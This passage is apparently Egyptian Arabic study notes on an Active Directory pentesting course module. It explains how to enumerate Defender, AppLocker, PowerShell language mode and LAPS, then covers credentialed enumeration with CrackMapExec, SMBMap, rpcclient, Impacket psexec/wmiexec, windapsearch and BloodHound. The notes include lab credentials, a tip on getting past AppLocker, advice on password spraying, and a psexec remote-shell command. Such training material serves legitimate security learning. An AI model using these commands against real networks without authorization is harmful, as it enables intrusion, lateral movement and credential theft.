## هل ينفع نتخطاه؟

الكاتب قال.

أيوه.

---

لكن.

طرق الـ Bypass.

مش ضمن الموديول.

---

## معرفة حالة Defender

الأمر

```powershell
Get-MpComputerStatus
```

---

## نشرح

### Get

يعني.

هات.

---

### Mp

اختصار.

Microsoft Protection.

---

### ComputerStatus

حالة الحماية.

---

## الناتج

هيظهر حاجات كتير.

---

## AMEngineVersion

```text
AMEngineVersion
```

---

إصدار محرك الـ Antivirus.

---

## AntivirusEnabled

```text
AntivirusEnabled : True
```

---

يعني.

الـ Antivirus شغال.

---

## AntispywareEnabled

```text
True
```

---

يعني.

الحماية ضد Spyware شغالة.

---

## AMServiceEnabled

يعني.

خدمة Defender نفسها شغالة.

---

## RealTimeProtectionEnabled

أهم قيمة.

---

```text
True
```

---

يعني.

Real-Time Protection شغالة.

---

## يعني إيه Real-Time Protection؟

يعني.

أي ملف.

ينزل.

أو يتفتح.

أو يتنفذ.

---

Defender.

هيفحصه فورًا.

---

ولو اعتبره Malware.

هيمنعه.

---

## لو كانت False؟

يبقى.

الحماية اللحظية.

مقفولة.

---

وده بيسهل.

تشغيل أدوات كتير.

---

## AppLocker

وسيلة حماية تانية.

---

## يعني إيه AppLocker؟

هو نظام.

بيحدد.

أنهي برامج.

ينفع تشتغل.

---

وأنهي برامج.

مينفعش.

---

يعني.

بدل ما يمنع Malware فقط.

هو بيقول:

```
البرنامج ده مسموح.

البرنامج ده ممنوع.
```

---

## يعني Application Whitelisting؟

يعني.

بدل Blacklist.

---

يبقى.

Whitelist.

---

يعني.

اسمح فقط.

للبرامج المعروفة.

---

أي برنامج جديد.

هيتمنع.

---

## AppLocker بيقدر يمنع

- EXE
- DLL
- Scripts
- MSI
- PowerShell
- Store Apps

---

## الشركات غالبًا بتعمل إيه؟

بتمنع:

```text
cmd.exe
```

---

و

```text
powershell.exe
```

---

لكن.

ينسوا.

إن PowerShell.

ليها نسخ تانية.

---

زي.

```text
SysWOW64
```

---

أو.

```text
PowerShell_ISE.exe
```

---

فالمهاجم.

يستخدم نسخة تانية.

---

## معرفة AppLocker Rules

الأمر

```powershell
Get-AppLockerPolicy -Effective
```

---

## -Effective

يعني.

هات الـ Rules.

اللي مطبقة فعليًا.

---

## الناتج

مثلاً.

```text
Block PowerShell
```

---

وده معناه.

PowerShell.

ممنوعة.

---

لكن.

لاحظ.

المسار.

```text
system32
```

---

يعني.

هو منع.

نسخة واحدة.

---

ممكن.

نسخة تانية.

تشتغل.

---

## Default Rules

هنلاقي.

Rules.

اسمها.

```
Default Rule
```

---

زي.

```text
Program Files
```

---

يعني.

أي برنامج.

داخل.

Program Files.

مسموح.

---

وده معناه.

لو قدرت.

تشغل أداة.

من Program Files.

قد تشتغل.

---

## PowerShell Constrained Language Mode

وسيلة حماية مهمة جدًا.

---

## يعني إيه؟

PowerShell فيها.

أوضاع تشغيل.

---

أشهرهم.

```
FullLanguage
```

---

و

```
ConstrainedLanguage
```

---

## Full Language

يعني.

PowerShell.

تشتغل بكل إمكانياتها.

---

## Constrained Language

يعني.

PowerShell.

مقيدة.

---

## إيه اللي بيتمنع؟

الكاتب ذكر:

- COM Objects
- PowerShell Classes
- XAML
- بعض أنواع .NET Objects

---

وده بيمنع.

كتير من أدوات الهجوم.

---

## معرفة Language Mode

الأمر

```powershell
$ExecutionContext.SessionState.LanguageMode
```

---

## لو ظهر

```text
ConstrainedLanguage
```

---

يبقى.

PowerShell.

مقيدة.

---

أما.

```text
FullLanguage
```

---

يبقى.

كل الإمكانيات.

متاحة.

---

## LAPS

الكاتب رجع اتكلم عنه.

لكن من ناحية Enumeration.

---

## يعني إيه LAPS؟

اختصار.

```
Local Administrator Password Solution
```

---

وده نظام.

بيخلي.

كل جهاز.

له Password مختلفة.

للـ Local Administrator.

---

وكمان.

بتتغير.

كل فترة.

---

## ليه ده مهم؟

لأنه.

يمنع.

Password Reuse.

---

## LAPSToolkit

فيه Toolkit.

اسمها.

```
LAPSToolkit
```

---

بتساعدنا.

نعرف.

كل المعلومات.

عن LAPS.

---

## Find-LAPSDelegatedGroups

الأمر

```powershell
Find-LAPSDelegatedGroups
```

---

## بيعمل إيه؟

بيجيب.

المجموعات.

اللي ليها حق.

تقرأ.

Passwords.

---

مثلاً.

```text
Domain Admins
```

---

يعني.

أي Domain Admin.

يقدر.

يشوف.

LAPS Password.

---

وبرضو.

```text
LAPS Admins
```

---

دي مجموعة.

متخصصة.

في إدارة LAPS.

---

## ليه ده مهم؟

لو قدرت.

تاخد Account.

من المجموعات دي.

---

هتعرف.

Passwords.

لكل الأجهزة.

---

## Find-AdmPwdExtendedRights

الأمر

```powershell
Find-AdmPwdExtendedRights
```

---

## بيعمل إيه؟

بيشوف.

مين.

عنده صلاحية.

```
All Extended Rights
```

---

## يعني إيه All Extended Rights؟

صلاحية واسعة على الـ Computer Object.

ومن ضمنها.

إمكانية قراءة Password الخاصة بـ LAPS.

---

يعني.

مش لازم يبقى.

Domain Admin.

---

ممكن.

User عادي.

لكن واخد.

الصلاحية دي.

---

وده بيكون هدف مهم جدًا أثناء الـ Enumeration.

---

## Get-LAPSComputers

الأمر

```powershell
Get-LAPSComputers
```

---

## بيعمل إيه؟

بيعرض.

كل الأجهزة.

اللي عليها.

LAPS.

---

وكمان.

يعرض:

- Password.
- Expiration Date.

---

## مثال

```text
ComputerName

WS01
```

---

اسم الجهاز.

---

```text
Password

TCaG-F)3No;l8C
```

---

دي.

Password الحالية.

---

```text
Expiration

09/26/2020
```

---

ميعاد.

تغيير Password.

---

## هل أي User يقدر يشوف Password؟

لا.

---

لازم.

الحساب.

يكون عنده.

صلاحية.

لقراءتها.

---

## Conclusion

الكاتب ختم الجزء ده برسالة مهمة.

---

مش كل الـ Enumeration.

بيبقى عن:

Users.

Groups.

Computers.

---

لازم كمان.

تعرف.

وسائل الحماية.

---

لأنها.

هي اللي هتحدد:

- أنهي أدوات تشتغل.
- أنهي أدوات تتمنع.
- أنهي أوامر آمنة.
- وإمتى تحتاج تستخدم أسلوب **Living Off The Land** بدل تنزيل أدوات خارجية.

---

## ملخص الفصل

بعد إنهاء الفصل ده بقيت تعرف:

- يعني إيه Security Controls وليه لازم تعمل لها Enumeration.
- يعني إيه Living Off The Land وليه مهم أثناء الـ Pentest.
- إزاي تعرف حالة Windows Defender باستخدام `Get-MpComputerStatus`.
- إيه هو AppLocker وإزاي تعرف الـ Rules المطبقة باستخدام `Get-AppLockerPolicy`.
- الفرق بين **Full Language Mode** و**Constrained Language Mode** في PowerShell.
- إزاي تعرف الـ Language Mode الحالي.
- يعني إيه LAPS وليه بيمنع إعادة استخدام كلمات مرور الـ Local Administrator.
- استخدام `Find-LAPSDelegatedGroups` لمعرفة المجموعات التي تستطيع قراءة كلمات مرور LAPS.
- استخدام `Find-AdmPwdExtendedRights` لمعرفة الحسابات التي تمتلك صلاحية **All Extended Rights**.
- استخدام `Get-LAPSComputers` لمعرفة الأجهزة التي تستخدم LAPS وكلمات المرور وتاريخ انتهاء صلاحيتها (إذا كانت لديك الصلاحيات اللازمة).
- إن معرفة وسائل الحماية تعتبر خطوة أساسية قبل بدء أي Enumeration أو Exploitation داخل بيئة Active Directory.

----
# Layer 14

الفكرة الأساسية: أنت بالفعل حصلت على **Domain User credentials**، فبدل ما تفضل تعمل enumeration محدود، هتستغل الـ credentials دي عشان تجمع أكبر قدر ممكن من معلومات الـ AD: users، groups، computers، sessions، shares، permissions، ACLs، trusts، GPOs، وفي الآخر تستخدم **BloodHound** عشان تحول المعلومات دي لـ attack paths.

---

## أولاً: يعني إيه Credentialed Enumeration؟

افترض إنك في Pentest دخلت الشبكة ووصلت لواحد من الـ domain users.

مثلاً:

```text
Username: forend
Password: Klmcargo2
Domain: INLANEFREIGHT.LOCAL
```

أنت هنا **مش Domain Admin**.

لكن مجرد إن معاك credentials صحيحة لمستخدم عادي، ده ممكن يديك كمية معلومات ضخمة عن الـ Active Directory.

وده لأن AD معمول بحيث المستخدمين العاديين يقدروا يعرفوا حاجات كتير عن الـ domain.

مثلاً ممكن تعرف:

```text
Users
Groups
Computers
Group Membership
Logged-on Users
SMB Shares
GPOs
ACLs
Trusts
Sessions
Privileged Users
```

والهدف مش مجرد "نجمع معلومات".

الهدف الحقيقي:

```text
Valid Credentials
       ↓
Enumeration
       ↓
Find Interesting Users / Groups / Hosts
       ↓
Find Privileges / Sessions / Shares
       ↓
Find Attack Path
       ↓
Privilege Escalation / Lateral Movement
```

---

## لازم يكون معاك Credentials

الـ module بيأكد على نقطة مهمة جداً:

أغلب الأدوات دي محتاجة authentication.

يعني على الأقل لازم يكون عندك واحد من دول:

```text
Cleartext password
NTLM hash
SYSTEM access on domain-joined host
```

ليه؟

لأنك لو معاك Domain credentials، تقدر تعمل LDAP/SMB/RPC queries بصلاحيات المستخدم ده.

أما لو مفيش authentication، بعض المعلومات فقط ممكن تكون متاحة حسب إعدادات الـ domain.

---

## CrackMapExec

## يعني إيه CrackMapExec؟

**CrackMapExec أو CME** أداة قوية جداً في Windows/Active Directory pentesting.

هي basically بتديك interface واحدة تتعامل بيها مع protocols مختلفة.

الملف بيذكر:

```text
MSSQL
SMB
SSH
WinRM
```

يعني مثلاً:

```text
crackmapexec smb
crackmapexec winrm
crackmapexec ssh
crackmapexec mssql
```

والأداة حالياً مرتبطة بشكل كبير بـ **NetExec** كبديل/تطور لـ CME.

---

## ليه CME مهمة؟

لأنك بدل ما تستخدم أداة مختلفة لكل حاجة، CME بتخليك تعمل حاجات كتير من مكان واحد.

مثلاً:

```text
Authenticate
↓
Enumerate users
↓
Enumerate groups
↓
Enumerate shares
↓
Find logged-on users
↓
Check access
↓
Spider shares
```

وده بيوفر وقت ضخم أثناء الـ Pentest.

---

## `crackmapexec -h`

لما تعمل:

```bash
crackmapexec -h
```

بيطلعلك الـ help menu.

أهم حاجة هنا إنك تعرف الـ protocols:

```text
mssql
smb
ssh
winrm
```

وكمان options عامة زي:

```text
-t
--timeout
--jitter
--verbose
```

### `-t`

عدد الـ threads اللي الأداة تستخدمها.

مثلاً:

```bash
-t 50
```

يعني استخدم 50 concurrent threads.

الـ default في المثال:

```text
100
```

---

### `--timeout`

أقصى وقت تنتظره لكل connection/thread.

---

### `--jitter`

بيضيف delay عشوائي بين الاتصالات.

وده ممكن يكون مفيد في بعض الـ assessment scenarios عشان تقلل الـ bursty traffic.

---

### `--verbose`

يطلع information أكتر أثناء التشغيل.

---

## CME مع SMB

لما تعمل:

```bash
crackmapexec smb -h
```

هتشوف options كتير جداً.

أهم ones بالنسبة للـ enumeration:

```text
-u
-p
-d
--users
--groups
--loggedon-users
--shares
```

---

## `-u`

الـ username اللي هتستخدمه authentication.

مثلاً:

```bash
-u forend
```

---

## `-p`

الـ password.

```bash
-p Klmcargo2
```

---

## `-d`

الـ domain.

مثلاً:

```bash
-d INLANEFREIGHT.LOCAL
```

---

## Target

آخر جزء هو الجهاز اللي أنت بتعمل عليه enumeration.

ممكن يكون:

```text
IP
Hostname
FQDN
IP range
CIDR
File containing targets
```

مثلاً:

```bash
172.16.5.5
```

وده في اللاب هو الـ Domain Controller.

---

## Domain User Enumeration

الأمر المستخدم:

```bash
sudo crackmapexec smb 172.16.5.5 -u forend -p Klmcargo2 --users
```

تعالى نفككه:

```text
sudo
```

تشغيل بصلاحيات أعلى على Linux.

```text
crackmapexec
```

الأداة.

```text
smb
```

هنستخدم SMB.

```text
172.16.5.5
```

الـ target.

```text
-u forend
```

الـ username.

```text
-p Klmcargo2
```

الـ password.

```text
--users
```

اعرض الـ domain users.

---

## الـ Output

مثلاً:

```text
SMB 172.16.5.5 445 ACADEMY-EA-DC01
```

ده معناه إن CME اتصل بالـ host على:

```text
Port: 445
Protocol: SMB
Hostname: ACADEMY-EA-DC01
```

---

بعدها:

```text
domain: INLANEFREIGHT.LOCAL
```

يعني الجهاز عضو في الـ domain ده.

---

ثم:

```text
[+] INLANEFREIGHT.LOCAL\forend:Klmcargo2
```

دي معناها:

**الـ credentials صحيحة والـ authentication نجح.**

---

## `badPwdCount`

بعدها تلاقي:

```text
administrator badpwdcount: 0
avazquez badpwdcount: 3
```

دي مهمة جداً.

`badPwdCount` = عدد محاولات تسجيل الدخول الفاشلة المسجلة للحساب.

مثلاً:

```text
administrator → 0
avazquez → 3
```

لو بتعمل password spraying، المعلومة دي ممكن تساعدك تعرف الحسابات اللي بالفعل عندها failed attempts.

الفكرة إنك تكون حذر من **account lockout**.

مثلاً:

```text
User A
badPwdCount = 0

User B
badPwdCount = 3
```

لو policy بتاعت الشركة بتقفل الحساب بعد عدد معين من المحاولات، User B أخطر في إنك تجرب عليه passwords إضافية.

---

## Domain Groups

الأمر:

```bash
sudo crackmapexec smb 172.16.5.5 -u forend -p Klmcargo2 --groups
```

بدل:

```text
--users
```

استخدمنا:

```text
--groups
```

عشان نجيب الـ groups.

---

## ليه الـ Groups مهمة؟

لأن الـ user نفسه ممكن يكون عادي، لكن يكون عضو في group عندها privileges عالية.

مثلاً:

```text
forend
   ↓
IT Admins
   ↓
Administrators
```

فأنت لازم تفهم:

```text
User
↓
Groups
↓
Privileges
```

---

## مثال من الـ output

```text
Administrators membercount: 3
```

يعني group اسمها:

```text
Administrators
```

وفيها 3 members.

---

```text
Domain Admins membercount: 19
```

دي أهم بكتير.

لأن:

```text
Domain Admins
```

من أعلى الـ privileged groups في الـ domain.

---

وفيه:

```text
Backup Operators
```

وده group مهم برضه لأن بعض الصلاحيات المرتبطة بالـ backup ممكن تكون powerful جداً.

---

وفي المثال فيه:

```text
Executives
Accounting
Engineering
Human Resources
```

مش كلهم privileged بالضرورة.

لكن مهم تعرف مين موجود فيهم، لأن group membership ممكن يكشف relationships أو paths مفيدة في الـ assessment.

---

## Logged-on Users

دلوقتي بدل ما نسأل:

> مين كل users في الـ domain؟

ممكن نسأل:

> مين currently logged on على الجهاز ده؟

الأمر:

```bash
sudo crackmapexec smb 172.16.5.130 -u forend -p Klmcargo2 --loggedon-users
```

الـ target هنا:

```text
172.16.5.130
```

والـ host:

```text
ACADEMY-EA-FILE
```

يعني File Server.

---

## ليه دي مهمة؟

لأنك ممكن تلاقي على الجهاز مستخدم privileged.

مثلاً الـ output فيه:

```text
clusteragent
lab_adm
svc_qualys
wley
```

لو عرفت إن:

```text
svc_qualys
```

Domain Admin، 
وجوده logged on على جهاز معين بيخلي الجهاز interesting جداً.

ليه؟

لأنك ممكن تعتبر الجهاز ده:

```text
Potential privilege pivot
```

يعني جهاز فيه session لمستخدم أعلى منك في الصلاحيات.

---

## `(Pwn3d!)`

في الـ output:

```text
[+] INLANEFREIGHT.LOCAL\forend:Klmcargo2 (Pwn3d!)
```

دي معناها إن الـ credentials نجحت، والـ user عنده **local administrative access** على الجهاز حسب تفسير CME.

يعني مثلاً:

```text
forend
   ↓
local admin
   ↓
ACADEMY-EA-FILE
```

ودي معلومة مهمة جداً.

لأنك مش بس عرفت إن الـ credentials valid.

أنت عرفت كمان:

```text
What host?
What access?
What users are logged in?
```

---

## Share Enumeration

دلوقتي عايزين نعرف الـ SMB shares الموجودة.

الأمر:

```bash
sudo crackmapexec smb 172.16.5.5 -u forend -p Klmcargo2 --shares
```

---

## يعني إيه SMB Share؟

تقدر تعتبرها folder/network resource موجود على جهاز وتقدر الأجهزة التانية تدخل عليه عن طريق SMB.

أمثلة:

```text
C$
ADMIN$
IPC$
SYSVOL
NETLOGON
Department Shares
User Shares
```

---

## أهم حاجة: Permissions

الـ output ممكن يقول:

```text
READ
WRITE
NO ACCESS
```

وده مهم جداً.

مثلاً:

```text
Department Shares → READ
```

معناه تقدر تقرأ.

لكن:

```text
ADMIN$ → NO ACCESS
```

معناه مش عندك access.

---

## `ADMIN$` و `C$`

دول **administrative shares** في Windows.

مثلاً:

```text
C$
```

بيمثل access للـ C: drive عبر SMB.

و:

```text
ADMIN$
```

مرتبط بـ Windows directory والإدارة عن بعد.

لو standard domain user عنده:

```text
NO ACCESS
```

ده طبيعي.

لكن لو user عنده administrative privileges، ممكن يحصل access.

---

## `IPC$`

ده share خاص بالـ inter-process communication وبعض عمليات الإدارة/الـ RPC.

وجود:

```text
READ
```

مش معناه إنك بتقرأ ملفات عادية منه.

---

## `NETLOGON`

Share موجود عادة على Domain Controllers.

بيستخدم في حاجات مرتبطة بالـ domain logon والـ scripts والسياسات ذات الصلة.

---

## `SYSVOL`

ده مهم جداً في Active Directory.

بيحتوي على بيانات مرتبطة بالـ domain، ومنها Group Policy-related files.

وغالباً domain users عندهم read access عليه.

---

## Shares Interesting

الملف بيلفت النظر لحاجات زي:

```text
Department Shares
User Shares
ZZZ_archive
```

ليه؟

لأن الـ custom shares ممكن تحتوي على:

```text
Passwords
Scripts
Configuration files
Documents
PII
Credentials
Backups
```

يعني الـ share نفسه مش vulnerability.

لكن **المحتوى الموجود عليه ممكن يكون حساس جداً**.

---

## Spider Plus

بدل ما تدخل كل folder manually، CME عنده module:

```text
spider_plus
```

الأمر:

```bash
sudo crackmapexec smb 172.16.5.5 \
-u forend \
-p Klmcargo2 \
-M spider_plus \
--share 'Department Shares'
```

---

## يعني إيه Spidering؟

يعني الأداة تمشي recursively داخل الـ share وتشوف الملفات اللي الـ account يقدر يوصل لها.

بدل:

```text
Department Shares
    ↓
Accounting
    ↓
Private
    ↓
file1
    ↓
file2
    ↓
...
```

الأداة تعمل ده بشكل automated.

---

## الـ Output

هتلاقي:

```text
OUTPUT: /tmp/cme_spider_plus
```

يعني النتائج هتتخزن هنا.

وفي المثال:

```text
/tmp/cme_spider_plus/172.16.5.5.json
```

---

## ليه JSON؟

عشان تقدر بعدين تعمل:

```text
Search
Filter
Parse
Report
```

بدل ما تعتمد على terminal output.

---

## مثال

الـ JSON فيه:

```json
"Accounting/Private/AddSelect.bat": {
    "atime_epoch": "...",
    "ctime_epoch": "...",
    "mtime_epoch": "...",
    "size": "278 Bytes"
}
```

هنا الأداة بتقولك:

```text
Path
Access time
Creation/change-related timestamps
Modification time
Size
```

مش بالضرورة محتوى الملف نفسه.

بعد كده تقدر تحدد files interesting وتفحصها حسب صلاحياتك.

---

## SMBMap

الأداة التانية:

```text
SMBMap
```

وظيفتها الأساسية enumeration لـ SMB.

الملف بيذكر إنها تقدر:

```text
List shares
Show permissions
List directories recursively
Search file contents
Download files
Upload files
Execute commands
```

لكن في مرحلة enumeration إحنا مهتمين بالجزء الأول.

---

### SMBMap Check Access

الأمر:

```bash
smbmap -u forend \
-p Klmcargo2 \
-d INLANEFREIGHT.LOCAL \
-H 172.16.5.5
```

نفككه:

```text
-u
```

username

```text
-p
```

password

```text
-d
```

domain

```text
-H
```

target host

---

## النتيجة

مثلاً:

```text
ADMIN$ → NO ACCESS
C$ → NO ACCESS
Department Shares → READ ONLY
IPC$ → READ ONLY
NETLOGON → READ ONLY
SYSVOL → READ ONLY
User Shares → READ ONLY
ZZZ_archive → READ ONLY
```

وده بيديك صورة سريعة جداً عن:

> "أنا كـ forend أقدر أعمل إيه على SMB بتاع الجهاز ده؟"

---

## Recursive Enumeration

دلوقتي عايزين نشوف directories داخل:

```text
Department Shares
```

الأمر:

```bash
smbmap -u forend \
-p Klmcargo2 \
-d INLANEFREIGHT.LOCAL \
-H 172.16.5.5 \
-R 'Department Shares' \
--dir-only
```

---

## `-R`

يعني recursive.

يعني مش بس:

```text
Department Shares
```

لكن يدخل جوه subdirectories.

---

## `--dir-only`

دي مهمة.

بدونها ممكن تشوف files وdirectories.

مع:

```text
--dir-only
```

أنت مهتم بالـ directories فقط.

---

## النتيجة

مثلاً:

```text
Accounting
Executives
Finance
HR
IT
Legal
Marketing
Operations
R&D
Temp
Warehouse
```

ده بيديك structure للشير.

وبعدها تقدر تحدد الأماكن اللي تستحق investigation.

مثلاً:

```text
IT
Finance
HR
Executives
```

طبيعي تكون interesting أكتر من directories عشوائية.

لكن مش معنى كده إنك تفترض إن فيها secrets؛ لازم تفحص فعلياً.

---

## rpcclient

دلوقتي عندنا أداة مختلفة:

```text
rpcclient
```

دي جزء من Samba.

بتتعامل مع:

```text
MS-RPC
```

وممكن تستخدمها في enumeration للـ AD objects.

---

## SMB NULL Session

ميزة مهمة هنا:

ممكن أحياناً تعمل connection بدون credentials.

الأمر:

```bash
rpcclient -U "" -N 172.16.5.5
```

معناه تقريباً:

```text
-U ""
```

username فاضي.

```text
-N
```

ما تسألش عن password.

لو الـ target يسمح بـ NULL session، هتدخل RPC interface.

---

## مهم جداً

مش معنى إن الأمر ده موجود إن كل AD environment هيسمح بيه.

ده يعتمد على configuration.

في environments حديثة ومؤمنة غالباً الوصول ده بيكون restricted.

---

## RID

هنا لازم نفهم حاجة أساسية جداً في Windows Security:

```text
SID
RID
```

---

## SID

الـ SID هو identifier فريد للـ security principal.

مثلاً domain SID في الملف:

```text
S-1-5-21-3842939050-3880317879-2865463114
```

---

## RID

الـ RID هو الجزء اللي بيميز object معين داخل الـ domain SID.

مثلاً:

```text
Domain SID
+
RID
=
Full User SID
```

---

## مثال الملف

Domain SID:

```text
S-1-5-21-3842939050-3880317879-2865463114
```

User:

```text
htb-student
```

RID:

```text
0x457
```

والـ hex:

```text
0x457
```

يساوي decimal:

```text
1111
```

فالـ full SID:

```text
S-1-5-21-3842939050-3880317879-2865463114-1111
```

وده بيمثل user محدد داخل الـ domain.

---

## ليه RID مهم؟

لأن بعض الـ built-in accounts عندها RIDs معروفة.

مثلاً:

```text
Administrator
RID = 500
```

والـ hexadecimal:

```text
0x1f4
```

فلو شفت:

```text
rid:0x1f4
```

تقدر تعرف إن ده الـ built-in Administrator account في السياق المناسب.

---

## `queryuser`

داخل rpcclient ممكن تعمل:

```text
queryuser 0x457
```

وده معناه:

> هات معلومات الـ AD user اللي RID بتاعه 0x457.

---

## النتيجة

مثلاً:

```text
User Name: htb-student
Full Name: Htb Student
```

وتلاقي information إضافية زي:

```text
Logon Time
Password last set
Password can change
bad_password_count
logon_count
user_rid
group_rid
```

---

## `bad_password_count`

هنا نفس الفكرة اللي شفناها في CME.

بتعرف عدد محاولات الـ password الفاشلة.

---

## `logon_count`

عدد مرات تسجيل الدخول المسجلة للحساب.

---

## `user_rid`

الـ RID الخاص بالـ user.

---

## `enumdomusers`

بدل ما تعرف RID واحد وتعمل:

```text
queryuser
```

تقدر تعمل:

```text
enumdomusers
```

وده يرجع users والـ RIDs بتاعتهم.

مثلاً:

```text
administrator → 0x1f4
guest         → 0x1f5
krbtgt        → 0x1f6
lab_adm       → 0x3e9
htb-student   → 0x457
avazquez      → 0x458
```

وده بيديك mapping:

```text
Username ↔ RID
```

وده مفيد جداً في enumeration.

---

## Impacket

دلوقتي بندخل على toolkit ضخم جداً:

```text
Impacket
```

Impacket عبارة عن Python toolkit للتعامل مع Windows protocols وعمليات enumeration/interactions مختلفة.

في الملف التركيز هنا على:

```text
psexec.py
wmiexec.py
```

---

## `psexec.py`

دي من أشهر أدوات Impacket.

فكرتها:

لو عندك credentials لمستخدم **Local Administrator** على جهاز، تقدر تعمل remote execution.

---

## بتشتغل إزاي conceptually؟

حسب الملف:

```text
Credentials
    ↓
Connect to ADMIN$
    ↓
Upload executable
    ↓
Create Windows service
    ↓
Service Control Manager
    ↓
Named Pipe
    ↓
Remote shell
```

والـ shell بيكون:

```text
SYSTEM
```

على الـ target.

---

## مثال

```bash
psexec.py inlanefreight.local/wley:'transporter@4'@172.16.5.125
```

الـ structure:

```text
domain/user:password@target
```

---

## ليه لازم Local Admin؟

لأن الطريقة محتاجة صلاحيات administrative على الجهاز المستهدف.

يعني:

```text
Valid credentials
```

لوحدها مش كفاية.

لازم:

```text
Valid credentials
+
Local Administrator privilege
```

---

## ليه `SYSTEM` مهمة؟

لو دخلت:

```text
SYSTEM
```

فأنت واخد أعلى مستوى من privileges على الجهاز المحلي تقريباً.

وده يفتح لك مجال كبير لـ:

```text
Local enumeration
Credential access
Token/session investigation
Lateral movement
Persistence
```

حسب نطاق الـ assessment.

---

## `wmiexec.py`

دي طريقة تانية للـ remote command execution.

لكن بدل ما تعتمد على إنشاء service زي psexec، بتستخدم:

```text
WMI
```

يعني:

```text
Windows Management Instrumentation
```

---

## الفرق الأساسي

`psexec.py`:

```text
Creates service
↓
Executes
↓
SYSTEM
```

`wmiexec.py`:

```text
WMI
↓
Execute command
↓
Runs under connected user's context
```

يعني لو دخلت بـ:

```text
wley
```

الأوامر غالباً هتشتغل كـ:

```text
wley
```

مش SYSTEM.

---

## ليه WMI أقل وضوحاً أحياناً؟

الملف بيذكر إن `wmiexec.py`:

- لا يسقط executable بنفس طريقة psexec
    
- يستخدم WMI
    
- shell شبه interactive
    
- ممكن ينتج logs أقل من بعض الطرق الأخرى
    

لكن:

**ده مش معناه إنه invisible.**

الملف نفسه بيوضح إن defenders ممكن يشوفوا process creation events، ومنها Event ID:

```text
4688
```

لإن WMI ممكن يؤدي إلى تشغيل:

```text
cmd.exe
```

على الـ target.

وكمان modern AV/EDR ممكن يكتشف السلوك.

---

## Windapsearch

دلوقتي أداة مختلفة:

```text
Windapsearch
```

دي Python script بتستخدم:

```text
LDAP queries
```

عشان تعمل enumeration للـ Active Directory.

تقدر تجيب:

```text
Users
Groups
Computers
Privileged Users
Domain Admins
GPOs
SPNs
Unconstrained delegation
```

وغيرها حسب الخيارات.

---

## LDAP يعني إيه؟

ببساطة:

Active Directory
بيخزن objects في directory.

زي:

```text
Users
Groups
Computers
Organizational Units
```

والـ LDAP هو protocol تستخدمه عشان تسأل الـ directory عن البيانات دي.

فبدل ما تقول:

> "هاتلي كل users"

بـ SMB/RPC، هنا أنت بتقول:

> "اعمل LDAP query على الـ directory وهاتلي الـ objects اللي أنا عايزها."

---

## أهم Windapsearch Options

```text
-G
```

كل groups.

```text
-U
```

كل users.

```text
-C
```

كل computers.

```text
--da
```

أعضاء Domain Admins.

```text
-PU
```

privileged users، مع recursive nested group lookup.

```text
--gpos
```

GPOs.

---

## `--da`

الأمر:

```bash
python3 windapsearch.py \
--dc-ip 172.16.5.5 \
-u forend@inlanefreight.local \
-p Klmcargo2 \
--da
```

المهم هنا:

```text
--dc-ip
```

مين الـ Domain Controller.

```text
-u
```

LDAP bind account.

```text
-p
```

password.

```text
--da
```

جيب Domain Admins.

---

## LDAP Bind

في الـ output:

```text
Attempting bind
...success!
Binded as:
INLANEFREIGHT\forend
```

يعني الأداة عملت authentication على LDAP باستخدام:

```text
forend
```

---

## `defaultNamingContext`

الأداة تلاقي:

```text
DC=INLANEFREIGHT,DC=LOCAL
```

ده الـ LDAP Distinguished Name الخاص بالـ domain.

يعني:

```text
INLANEFREIGHT.LOCAL
```

بيتم تمثيله في LDAP كـ:

```text
DC=INLANEFREIGHT,DC=LOCAL
```

---

## Domain Admin Enumeration

النتيجة:

```text
Found 28 Domain Admins
```

وبعدين:

```text
Administrator
lab_adm
Matthew Morgan
...
```

ده مهم جداً لأنك عرفت مين أعضاء:

```text
Domain Admins
```

---

## `-PU`

دي واحدة من أهم options.

```bash
-PU
```

معناها:

> دور على privileged users، بما في ذلك nested group memberships.

---

## يعني إيه Nested Groups؟

مثلاً:

```text
User A
   ↓
Group A
   ↓
Group B
   ↓
Domain Admins
```

User A مش مكتوب مباشرة كعضو في Domain Admins.

لكن بسبب الـ nesting:

```text
User A
```

في الآخر عنده privileges مرتبطة بـ:

```text
Domain Admins
```

وده ممكن يكون سهل جداً يتفوت لو أنت بتبص على direct membership فقط.

عشان كده `-PU` بيعمل recursive lookup.

---

## Enterprise Admins

الـ output كمان بيجيب:

```text
Enterprise Admins
```

مثلاً:

```text
Found 3 nested users
```

وفيهم:

```text
Administrator
lab_adm
Sharepoint Admin
```

وده بيوضح ليه nested groups خطيرة.

ممكن user شكله عادي في group معينة، لكن عن طريق سلسلة memberships يوصل في الآخر لصلاحيات ضخمة.

---

## BloodHound.py

وده أهم جزء تقريباً في الـ module.

```text
BloodHound
```

مش مجرد tool تعمل enumeration.

هو بيحول الـ AD data إلى **Graph**.

يعني بدل ما عندك:

```text
User A
Group B
Computer C
ACL D
Session E
```

كلهم منفصلين في outputs مختلفة، BloodHound يربطهم ببعض.

---

## يعني إيه Graph؟

تخيل:

```text
User
  |
  | MemberOf
  ↓
Group
  |
  | AdminTo
  ↓
Computer
  |
  | HasSession
  ↓
Domain Admin
```

BloodHound يرسم العلاقات دي.

وده يخليك تشوف:

> "لو أنا بدأت من الـ user ده، إيه أقصر path ممكن يوصلني لمكان privileged؟"

---

## ليه BloodHound قوية؟

لأن AD environments ممكن تكون ضخمة جداً.

مثلاً في اللاب:

```text
564 computers
2951 users
183 groups
2 trusts
```

لو هتحلل كل ده manually، الموضوع مرهق جداً.

BloodHound تحول البيانات لـ graph وتساعدك تكتشف:

```text
Attack Paths
ACL abuse opportunities
Group relationships
Sessions
Local Admin access
RDP
WinRM
GPO relationships
Trusts
```

الملف بيصفها بأنها من أقوى أدوات auditing للـ Active Directory، وبيوضح إنها تستخدم **graph theory** لتمثيل العلاقات.

---

## BloodHound بيتكون من جزئين مهمين

## Collector / Ingestor

في Linux:

```text
BloodHound.py
```

وفي Windows تاريخياً:

```text
SharpHound
```

وظيفتهم:

```text
Collect AD data
```

---

## BloodHound GUI

ده الجزء اللي:

```text
يستقبل JSON
↓
يحط البيانات في database
↓
يعرض Graph
↓
يشغل Queries
```

---

## BloodHound.py Options

مثلاً:

```text
-c
-u
-p
-ns
-d
-dc
```

---

## `-c`

Collection method.

ممكن تجمع حاجات معينة:

```text
Group
LocalAdmin
Session
Trusts
DCOnly
ACL
RDP
PSRemote
ObjectProps
```

أو:

```text
all
```

---

## `-ns`

Nameserver.

في المثال:

```text
-ns 172.16.5.5
```

يعني استخدم الـ Domain Controller كـ DNS nameserver.

---

## `-d`

الـ domain:

```text
-d inlanefreight.local
```

---

## `-c all`

دي بتقول:

